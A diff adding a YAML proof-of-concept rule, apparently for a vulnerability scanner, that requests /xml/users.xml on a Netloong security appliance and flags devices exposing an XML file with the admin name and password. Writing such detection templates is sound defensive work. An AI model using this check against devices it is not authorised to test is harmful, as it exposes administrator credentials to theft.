@@ -1,0 +1,10 @@
+name: poc-yaml-netloong-waf-unauthorized
+rules:
+  - method: GET
+    path: /xml/users.xml
+    expression: response.status == 200 && response.body.bcontains(b'id="0" name="admin" pwd=') && response.body.bcontains(b'<?xml version="1.0')
+detail:
+    author: fengyang(https://github.com/bigDevi1)
+    links:
+        - https://t.zsxq.com/BEAemq7
+    description: 博华网龙信息安全一体机存在通用未授权漏洞
